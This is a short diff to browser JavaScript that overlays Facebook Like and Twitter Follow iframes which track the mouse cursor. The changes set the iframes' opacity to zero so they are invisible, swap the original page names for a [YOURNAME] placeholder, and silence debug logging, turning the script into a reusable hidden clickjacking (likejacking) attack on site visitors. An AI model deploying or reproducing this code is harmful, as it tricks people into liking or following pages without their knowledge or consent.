@@ -28,7 +28,7 @@
              
             
            like = document.createElement('iframe');
-           like.src = 'http://www.facebook.com/plugins/like.php?href=' + encodeURIComponent("http://www.facebook.com/pages/Night-Lion-Security/187265988021862") + '&amp;layout=compact&amp;show_faces=false&amp;width=53&amp;action=like&amp;colorscheme=light&amp;height=80';
+           like.src = 'http://www.facebook.com/plugins/like.php?href=' + encodeURIComponent("http://www.facebook.com/pages/[YOURNAME]") + '&amp;layout=compact&amp;show_faces=false&amp;width=53&amp;action=like&amp;colorscheme=light&amp;height=80';
            like.scrolling = 'no';
            like.frameBorder = 0;
            like.allowTransparency = 'true';
@@ -38,7 +38,7 @@
            like.style.width = '53px';
            like.style.height =  '23px';
            like.style.position = 'absolute';
-           like.style.opacity = 1; // Change to 0 to hide or 1 to show
+           like.style.opacity = 0; // Change to 0 to hide or 1 to show
            document.getElementsByTagName('body')[0].appendChild(like);
           
            _this.addEventListener('mousemove', mouseMove, false);
@@ -63,7 +63,7 @@
             var standardbody;
             
             jQuery(function(){
-                jQuery("body").append('<div style="overflow: hidden;width: 10px;height: 12px;position:absolute;filter:alpha(opacity=1);-moz-opacity:1.0;-khtml-opacity:1.0;opacity: 1.0;" id="twitterContainer"><iframe src="http://platform.twitter.com/widgets/follow_button.html?screen_name=NightLion&show_count=false" scrolling="no" frameborder="0"  style="border:none;overflow:hidden;width:50px;height:23px;" allowTransparency="true" id="twitter_frame" name="twitter_frame"></iframe></div>');
+                jQuery("body").append('<div style="overflow: hidden;width: 10px;height: 12px;position:absolute;filter:alpha(opacity=0);-moz-opacity:0;-khtml-opacity:0;opacity:0;" id="twitterContainer"><iframe src="http://platform.twitter.com/widgets/follow_button.html?screen_name=[YOURNAME]&show_count=false" scrolling="no" frameborder="0"  style="border:none;overflow:hidden;width:50px;height:23px;" allowTransparency="true" id="twitter_frame" name="twitter_frame"></iframe></div>');
                 iflag = 0;
                 icontainer = document.getElementById('twitterContainer');
                 standardbody = (document.compatMode=="CSS1Compat") ? document.documentElement : document.body //create reference to common "body" across doctypescheckCookie();
@@ -93,7 +93,7 @@
             var standardbody;
             
             //alert("starting GOOGLE"); 
-            console.log("google running"); 
+            //console.log("google running"); 
             
 
             
@@ -149,13 +149,13 @@
                 x=x.replace(/^\s+|\s+$/g,"");
         
                 if (x==c_name) {
-                    console.log(unescape(y) );
+                    //console.log(unescape(y) );
                     return unescape(y);
                 }
             }
         };
         
-        // This will fail, should just use $.cookie(key, value, options)
+
         function setCookie(name,value,expires){
             if (exdays) {
               var date = new Date();
